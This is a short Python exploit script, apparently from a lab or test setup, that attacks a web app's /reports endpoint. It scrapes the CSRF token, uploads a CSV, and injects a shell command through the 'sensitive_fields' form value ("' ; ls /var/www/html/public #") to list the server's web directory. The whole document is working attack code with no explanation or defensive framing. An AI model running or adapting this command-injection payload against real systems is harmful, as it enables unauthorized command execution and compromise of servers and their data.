import requests
import re
import sys

def get_csrf_token(session, create_report_url):
    response = session.get(create_report_url)
    if response.status_code == 200:
        match = re.search(r'<input type="hidden" name="_token" value="([^"]+)">', response.text)
        if match:
            return match.group(1)
    return None

def exploit(base_url, csv_file_path, sensitive_fields, title="test", description="test", chart_type="bar", x_axis="x", y_axis="y"):
    create_report_url = f"{base_url}/reports/create"
    store_report_url = f"{base_url}/reports"

    with requests.Session() as session:
        csrf_token = get_csrf_token(session, create_report_url)
        if not csrf_token:
            print("[-] Could not retrieve CSRF token.")
            return

        files = {'csv_file': open(csv_file_path, 'rb')}
        data = {
            '_token': csrf_token,
            'title': title,
            'description': description,
            'sensitive_fields': sensitive_fields,
            'chart_type': chart_type,
            'x_axis': x_axis,
            'y_axis': y_axis,
        }

        response = session.post(store_report_url, data=data, files=files)

        print(f"[+] Response Status Code: {response.status_code}")
        print(f"[+] Response Text: {response.text}")

if __name__ == "__main__":
    base_url = "http://host.docker.internal:1337"
    csv_file_path = "dummy.csv"
    # Craft the payload to execute ls command
    sensitive_fields = "' ; ls /var/www/html/public #"
    exploit(base_url, csv_file_path, sensitive_fields)
